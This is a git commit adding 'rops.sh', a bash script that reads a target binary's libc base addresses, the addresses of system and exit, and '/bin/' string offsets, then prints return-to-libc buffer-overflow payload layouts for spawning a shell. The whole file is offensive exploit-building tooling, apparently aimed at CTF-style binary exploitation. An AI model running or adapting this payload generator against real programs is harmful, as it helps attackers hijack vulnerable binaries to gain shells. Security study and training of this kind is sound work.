5362afff06611a786642c4ada3834f52b59cacf8
Мартин <85664564+MartinxMax@users.noreply.github.com>
2024-09-09 02:19:31 +0900

    Add files via upload

---
+++ rops.sh
@@ -0,0 +1,124 @@
+#!/bin/bash
+
+echo -e '''
+ /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
+| $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
+| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
+| $$$$$$$/| $$  | $$| $$$$$$$/|  $$$$$$ 
+| $$__  $$| $$  | $$| $$____/  \____  $$
+| $$  \ $$| $$  | $$| $$       /$$  \ $$
+| $$  | $$|  $$$$$$/| $$      |  $$$$$$/
+|__/  |__/ \______/ |__/       \______/ 
+        Github==>https://github.com/MartinxMax
+        @Мартин. ROPS
+'''
+
+# 定义颜色
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+RESET='\033[0m'
+
+if [ -z "$1" ]; then
+    echo -e "${RED}Usage: $0 <binary_file>${RESET}"
+    exit 1
+fi
+
+if [ ! -f "$1" ]; then
+    echo -e "${RED}Error: File $1 not found!${RESET}"
+    exit 1
+fi
+
+binfile="$1"
+sopath=""
+system=""
+exit=""
+cmds=""
+base=""
+
+get_libc_address() {
+    ldd_output=$(ldd "$binfile" 2>/dev/null | grep 'libc.so.6' | awk '{print $3}')
+    if [ -z "$ldd_output" ]; then
+        echo -e "${RED}libc.so.6 not found in the binary.${RESET}"
+        return 1
+    else
+        echo "$ldd_output"
+    fi
+}
+
+sopath=$(get_libc_address)
+echo -e "${BLUE}libc path: $sopath${RESET}"
+
+stat_libc_addresses() {
+    libc_addresses=$(ldd "$binfile" 2>/dev/null | grep 'libc.so.6' | awk -F '[()]' '{print $2}' | sort -u)
+    
+    if [ -z "$libc_addresses" ]; then
+        echo -e "${RED}No libc.so.6 addresses found.${RESET}"
+        return 1
+    fi
+    
+    echo "$libc_addresses"
+}
+
+base=$(stat_libc_addresses)
+if [ -z "$base" ]; then
+    echo -e "${RED}No unique libc addresses found.${RESET}"
+    exit 1
+fi
+echo -e "${BLUE}Unique libc addresses: $base${RESET}"
+
+print_function_addresses() {
+    echo -e "${YELLOW}Reading function addresses from $sopath:${RESET}"
+
+    while IFS= read -r line; do
+        address=$(echo "$line" | awk '{print $1}')
+        function_name=$(echo "$line" | awk '{print $NF}' | sed 's/@.*//')
+        case "$function_name" in
+            "system")
+                system="$address"
+                ;;
+            "exit")
+                exit="$address"
+                ;;
+        esac
+    done < <(readelf -s "$sopath" | awk '$4 == "FUNC" && ($8 ~ /system@|exit@/) {print $2 " " $8}')
+
+    echo -e "${YELLOW}system function address: 0x$system${RESET}"
+    echo -e "${YELLOW}exit function address: 0x$exit${RESET}"
+}
+
+
+print_function_addresses
+
+
+list_executable_paths() {
+    local paths
+    paths=$(strings -a -t x "$sopath" | grep "/bin/" | awk '
+    {
+        address=$1
+        path=$2
+        printf "0x%s\n", address
+    }')
+
+    echo "$paths"
+    local address_list
+    address_list=$(echo "$paths" | grep '^0x' | sort -u)
+
+    echo "$address_list"
+}
+
+
+cmds=$(list_executable_paths)
+
+
+generate_payload() {
+    echo -e "${BLUE}Generating payload for libc address:${RESET}"
+    for libc_address in $base; do
+        for cmd in $cmds; do
+            echo -e "payload => ${GREEN}BUFFER + ($libc_address + 0x$system) + ($libc_address + 0x$exit) + ($libc_address + $cmd)${RESET}"
+        done
+    done
+}
+
+generate_payload
